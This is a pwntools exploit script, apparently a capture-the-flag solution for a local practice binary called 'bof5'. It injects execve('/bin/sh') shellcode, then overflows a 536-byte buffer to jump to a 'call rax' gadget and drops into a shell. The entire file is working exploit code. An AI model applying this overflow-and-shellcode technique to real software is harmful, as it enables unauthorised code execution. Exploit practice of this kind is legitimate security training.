#!/bin/python3
from pwn import * 
context.binary = exe = ELF('./bof5',checksec=False)
p = process('./bof5')

shellcode = asm('''
    mov rax,0x3b 
    mov rdi, 29400045130965551
    push rdi  
    mov rdi, rsp 
    xor rsi, rsi 
    xor rdx,rdx
       syscall

'''
)
call_rax = 0x0000000000401014
jmp_rax = 0x000000000040110c
input()
p.sendafter(b'>',shellcode)
p.sendafter(b'>', b'a' * 536 + p64(call_rax))

p.interactive()
